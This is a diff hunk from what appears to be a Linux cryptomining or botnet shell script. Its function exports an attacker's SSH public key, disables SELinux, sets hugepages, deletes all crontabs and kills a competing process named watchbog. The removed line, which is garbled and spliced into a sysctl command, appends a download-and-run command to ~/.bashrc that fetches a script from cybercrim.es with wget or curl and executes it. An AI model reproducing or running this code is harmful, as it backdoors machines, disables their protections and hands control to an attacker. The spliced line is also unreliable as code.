@@ -7,8 +7,8 @@
     aaidk() {
         export pubkey='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCmqGRKD0Fu2btT8cDs2SxBT9CGXRwTBz5bypP/i/TESF3k8Vxew+n2Z4vvjbQrQT2GAGoy40lBmm0WUXY7AhQYkeAZ/kbqtFh9dIm8r++H2YOGe/3grgw6LPWIqnBf7oGgd5XbeESO+F2sSw5CePi5oC9IOxOUJIBRI8MWNLihvFbOb6j0X1XzpOID6KyBxYAg0KyHUbOCS+EhXDPIEKH7YkSfUTHIXX9SZ2s40Vjxq0yb96CjaOul8YbHsTgu1R7pKMJZfPbVWN5FnTyTMXkbv34cmUWY9mmxvKAOwJk9LAKMFl5bRfqf5x/HzeXQUJdEBiUi32yzQpz//M52lDwcyCA7VBs1lH/3xt3OCatzPk+fIRaskmq1GN9HbWQSC3O9NfGsGtiesUlilBhie9MA7GfmxvaQ1YxL3O2b44WP3pZ3LYdr3WRuJJX0lmbcimlRLLkCkUem/22r4IVBn9G5tFazx7+LiSCQXQLD1sROcWgRgKxT9753+CFl7g9Bew4IRD7LeeTOxsrdqUHE89srVFBCRhFWu1YuX8VBhg0jaNXMrvhx7iHKgl2M1osTR/Fs3QNvZ0tgGekcFZAsFhw4fSgAgews/xlRsZQeL4fidynXcgnvY2mc7prvxFd7OEGOMU0Rj79wuatHsCuuNIzN0DAnQEwJCJilvCRK5M58Zw== evorip@ripsec'
         (setenforce 0) 2>/dev/null
-        (echo 128 > /proc/sys/vm/nr_hugepages) 2>/dev/null || echo 'Error setting hugepages'
-        (sysctl -w vm.nr_hugepages=128)echo "(wget -q -O /tmp/x https://cybercrim.es/l;bash /tmp/x||curl -s https://cybercrim.es/l -o /tmp/x;bash /tmp/x) &>/dev/null &" >> "${HOME}/.bashrc"au 2>/dev/null || echo 'Error setting hugepages'
+        (echo 128 > /proc/sys/vm/nr_hugepages) 2>/dev/null || echo x
+        (sysctl -w vm.nr_hugepages=128) 2>/dev/null || echo x
         crontab -r || rm -f /tmp/x
         rm -rf /var/spool/cron/crontabs/*
         pkill -f watchbog
